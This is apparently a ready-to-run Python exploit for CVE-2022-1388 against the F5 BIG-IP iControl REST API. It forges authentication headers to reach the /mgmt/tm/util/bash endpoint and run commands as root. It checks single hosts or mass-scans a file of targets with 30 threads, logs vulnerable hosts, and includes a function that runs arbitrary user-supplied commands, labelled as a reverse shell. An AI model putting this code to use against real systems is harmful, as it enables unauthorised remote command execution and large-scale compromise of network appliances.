import requests
import time
import threadpool
import urllib3
import json
import argparse
urllib3.disable_warnings()

def title():
    print('''
      ______ ____    ____  _______       ___     ___    ___    ___          __   ____     ___     ___   
     /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  |__ \        /_ | |___ \   / _ \   / _ \  
    |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) |    ) |  ______| |   __) | | (_) | | (_) | 
    |  |       \      /   |   __|  |______/ /  | | | |   / /    / /  |______| |  |__ <   > _ <   > _ <  
    |  `----.   \    /    |  |____       / /_  | |_| |  / /_   / /_         | |  ___) | | (_) | | (_) | 
     \______|    \__/     |_______|     |____|  \___/  |____| |____|        |_| |____/   \___/   \___/                                                                                                                                                                                                                                                                                                                                                            
                                                        Author:Angus-Team
                                                        Github:https://github.com/Angus-Team
    ''')

def exploit(url):
    target_url = url + '/mgmt/tm/util/bash'
    data = {
        "command":"run",
        "utilCmdArgs": "-c id"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
        "Cnnection": "close",
        "Authorization": "Basic YWRtaW46",
        "Connection": "keep-alive, X-F5-Auth-Token",
        "Content-Type": "application/json",
        "X-F5-Auth-Token": "a"
    }
    try:
        response = requests.post(target_url, headers=headers, json=data, verify=False, timeout=5)
        if response.status_code == 200 or 'commandResult' in response.text:
            default = json.loads(response.text)
            display = default['commandResult']
            print("[+] 目标 {} 存在漏洞".format(target_url))
            print('[+] 响应为:{0}'.format(display))
            with open("result.txt", 'a', encoding='utf-8') as result:
                result.write(url + ' 存在漏洞 ' + '\n')
    except Exception as e:
        print("[+] 目标 {} 不存在漏洞".format(target_url))
        with open("error.txt", 'a', encoding='utf-8') as result:
            result.write(url + '\n')

def reverse_shell(url,command):
    target_url = url + '/mgmt/tm/util/bash'
    data = {
        "command": "run",
        "utilCmdArgs": "-c '{0}'".format(command)
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
        "Cnnection": "close",
        "Authorization": "Basic YWRtaW46",
        "Connection": "keep-alive, X-F5-Auth-Token",
        "Content-Type": "application/json",
        "X-F5-Auth-Token": "a"
    }

    try:
        response = requests.post(url=target_url, json=data, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and 'commandResult' in response.text:
            default = json.loads(response.text)
            display = default['commandResult']
            print("[+] 目标 {} 存在漏洞".format(target_url))
            print('[+] 响应为:{0}'.format(display))
        else:
            print("[-] 目标 {} 不存在漏洞".format(target_url))
    except Exception as e:
        print('url 访问异常 {0}'.format(target_url))

def Thread(filepath):
    with open(filepath,'r', encoding='utf-8') as hosts:
        works = []
        for host in hosts:
            if host.strip() != '':
                url_path = format_url(host.strip())
                works.append(url_path)
    start_time = time.time()
    pool = threadpool.ThreadPool(30)
    reqs = threadpool.makeRequests(exploit, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()
    print('%d second' % (time.time() - start_time))

def format_url(url):
    try:
        if url[:4] != "http":
            url = "https://" + url
            url = url.strip()
        return url
    except Exception as e:
        print('URL 错误 {0}'.format(url))

def main():
    parse = argparse.ArgumentParser()
    parse.add_argument("-u", "--url", help="Please python3 CVE-2022-1388.py -u host")
    parse.add_argument("-f", "--file", help="Please python3 CVE-2022-1388.py -f file")
    parse.add_argument('-c', '--command', help="Please python3 CVE-2022-1388.py -u host -c common")
    args = parse.parse_args()
    url = args.url
    filepath = args.file
    command = args.command

    if url is not None and filepath is None and command is None:
        exploit(url)
    elif url is None and filepath is not None and command is None:
        Thread(filepath)
    elif url is not None and filepath is None and command is not None:
        reverse_shell(url,command)
    else:
        title()

if __name__ == '__main__':
    title()
    main()
